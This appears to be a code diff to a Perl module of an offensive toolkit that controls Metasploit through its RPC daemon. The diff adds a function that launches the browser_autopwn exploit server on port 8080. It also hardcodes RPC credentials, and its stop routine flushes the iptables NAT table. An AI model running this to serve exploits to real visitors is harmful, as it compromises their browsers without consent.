@@ -15,15 +15,15 @@ my $INFO    = "<www.dark-lab.net>";
 #TODO: for my insanity.... i Have to use THAT: https://github.com/SpiderLabs/msfrpc/tree/master/Net-MSFRPC
 # a look at https://github.com/SpiderLabs/msfrpc/blob/master/Net-MSFRPC/lib/Net/MSFRPC.pm
 my @PUBLIC_FUNCTIONS =
-	qw(configure msfrpcd_start msfrpc_call check_installation status where stop status_pids)
+	qw(configure msfrpcd_start msfrpc_call check_installation status where stop status_pids browser_autopwn)
 	;    #NECESSARY
 my $CONF = { VARS => { MSFRPCD_USER => 'spike',
 					   MSFRPCD_PASS => 'spiketest',
 					   MSFRPCD_PORT => 5553,
 					   CLIENT       => LWP::UserAgent->new,
-					   HOST			=> '127.0.0.1',
-					   MSFRPCD_API => '/api/',
-					   MESSAGEPACK => Data::MessagePack->new()
+					   HOST         => '127.0.0.1',
+					   MSFRPCD_API  => '/api/',
+					   MESSAGEPACK  => Data::MessagePack->new()
 			 }
 };
 nemesis_module;
@@ -33,10 +33,15 @@ sub msfrpc_call()
 	my $self = shift;
 	my $meth = shift;
 	my @opts = @_;
-	my $URL= 'http://'.$CONF->{'VARS'}->{'HOST'}.":".$CONF->{'VARS'}->{'MSFRPCD_PORT'}.$CONF->{'VARS'}->{'MSFRPCD_API'};
+	my $URL =
+		  'http://'
+		. $CONF->{'VARS'}->{'HOST'} . ":"
+		. $CONF->{'VARS'}->{'MSFRPCD_PORT'}
+		. $CONF->{'VARS'}->{'MSFRPCD_API'};
 	if ( $meth ne 'auth.login' and !$self->{_authenticated} )
 	{
 		$self->msfrpc_login();
+		unshift @opts, $self->{_token};
 	} elsif ( $meth ne 'auth.login' )
 	{
 		unshift @opts, $self->{_token};
@@ -49,8 +54,31 @@ sub msfrpc_call()
 	croak( "MSFRPC: Could not connect to " . $URL )
 		if $res->code == 500;
 	croak("MSFRPC: Request failed ($meth)") if $res->code != 200;
-	$Init->getIO()->debug_dumper($CONF->{'VARS'}->{'MESSAGEPACK'}->unpack( $res->content ));
+	$Init->getIO()
+		->debug_dumper(
+					$CONF->{'VARS'}->{'MESSAGEPACK'}->unpack( $res->content ) );
 	return $CONF->{'VARS'}->{'MESSAGEPACK'}->unpack( $res->content );
+}
+
+sub browser_autopwn()
+{
+	my $self = shift;
+	@OPTIONS = ( "auxiliary", "server/browser_autopwn",{ LHOST   => "0.0.0.0",
+			  SRVPORT => "8080",
+			  URIPATH => "/"
+	} );
+	$response=$self->msfrpc_call( "module.execute", @OPTIONS );
+	if(exists($response->{'uuid'})){
+	$Init->getIO()->print_info("Now you have to wait until browser_autopwn finishes loading exploits.");
+	$Init->getIO()->print_tabbed("Your Job ID : ".$response->{'job_id'},2);
+	$Init->getIO()->print_tabbed("Your UUID : ".$response->{'uuid'},2);
+	$Init->getIO()->print_tabbed("Your URL : http://0.0.0.0:8080",2);
+	
+	}
+	else {
+			$Init->getIO()->print_error("Something went wrong");
+		
+	}
 }
 
 sub msfrpc_login()
@@ -59,7 +87,6 @@ sub msfrpc_login()
 	my $user = $CONF->{'VARS'}->{'MSFRPCD_USER'};
 	my $pass = $CONF->{'VARS'}->{'MSFRPCD_PASS'};
 	my $ret  = $self->msfrpc_call( 'auth.login', $user, $pass );
-
 	$Init->getIO()->debug_dumper($ret);
 	if ( $ret->{'result'} eq 'success' )
 	{
@@ -112,12 +139,12 @@ sub msfrpcd_start
 			. $CONF->{'VARS'}->{'MSFRPCD_PORT'} . ' -S';
 		$Io->print_info("Starting msfrpcd service.");
 		my $Process = $Init->getModuleLoader->loadmodule('Process');
-		$Process->set( type => 'daemon',                       # forked pipeline
+		$Process->set( type => 'daemon',    # forked pipeline
 					   code => $code,
-					   Init =>$Init,
-					   	);
-					   	$Process->start();
-		$Io->debug($Io->generate_command($code));
+					   Init => $Init,
+		);
+		$Process->start();
+		$Io->debug( $Io->generate_command($code) );
 		$self->{'process'}->{'msfrpcd'} = $Process;
 		if ( $Process->is_running )
 		{
@@ -181,23 +208,6 @@ sub stop
 		}
 		$output->exec("iptables -t nat -F");
 	}
-}
-
-sub info
-{
-	my $self = shift;
-	my $IO   = $self->{'core'}->{'IO'};
-	my $env  = $self->{'core'}->{'env'};
-
-	# A small info about what the module does
-	$IO->print_info("->\tDummy module v$VERSION ~ $AUTHOR ~ $INFO");
-}
-
-sub configure
-{
-	my $self = shift;
-
-	#postgre pc_hba.conf
 }
 1;
 __END__
